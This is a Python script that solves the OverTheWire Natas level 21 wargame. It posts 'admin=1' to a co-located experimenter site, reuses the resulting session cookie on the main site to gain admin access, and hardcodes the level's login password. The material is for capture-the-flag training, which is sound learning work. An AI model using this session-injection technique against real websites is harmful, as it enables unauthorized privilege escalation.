import requests

username = 'natas21'
password = 'IFekPyrQXftziDEsUr3x21sYuahypdgJ'

url = "http://%s.natas.labs.overthewire.org" % username
coloc_url = "http://natas21-experimenter.natas.labs.overthewire.org"

data = {
    'submit': '',
    'admin': '1'
}

debug = {
    'debug': ''
}
s = requests.Session()
phpsessid = s.post(coloc_url, params=debug, data=data, auth=(username,password)).cookies['PHPSESSID']

cookies = {
    'PHPSESSID': phpsessid
}
r = s.get(url, params=debug, cookies=cookies, auth=(username, password))
print(r.text)